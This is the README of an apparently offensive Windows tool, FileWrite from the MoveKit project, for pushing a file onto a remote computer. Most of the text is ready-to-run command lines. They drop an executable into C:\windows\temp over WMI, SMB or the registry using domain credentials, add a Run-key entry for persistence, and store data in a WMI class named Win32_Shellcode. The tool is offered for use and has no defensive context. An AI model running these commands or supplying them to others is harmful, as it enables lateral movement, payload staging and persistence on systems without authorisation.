
### FileWrite - Write files or data to local or remote systems


#### Building
To compile open Visual Studio project and compile for release.

#### Options

  * WMI
  * SMB
  * Registry
  * WMI Class property
  * Remove WMI Class
  * Remove Registry key

```
FileWrite.exe writetype=wmi computername=target.domain eventname=Debug username=domain\user password=secret location=local droplocation="C:\windows\temp" filename=blah.exe
```

```
FileWrite.exe writetype=smb computername=target.domain eventname=Debug username=domain\user password=secret location=local droplocation="C:\windows\temp" filename=blah.exe
```

```
FileWrite.exe writetype=registry computername=target.domain eventname=Debug username=domain\user password=secret location=local droplocation="C:\windows\temp" filename=blah.exe keypath=HKCU:Software\Microsoft\Windows\Run valuename=Debug
```

```
FileWrite.exe writetype=wmiclass computername=target.domain username=domain\user password=secret location=local droplocation="C:\windows\temp" filename=blah.exe wminamespace=root\cimv2 classname=Win32_Shellcode
```

```
FileWrite.exe writetype=removewmiclass computername=target.domain username=domain\user password=secret wminamespace=root\cimv2 classname=Win32_Shellcode
```

```
FileWrite.exe writetype=removeregkey computername=target.domain username=domain\user password=secret keypath=HKCU:Software\Microsoft\Windows\Run valuename=Debug
```

Part of [MoveKit](https://github.com/0xthirteen/MoveKit)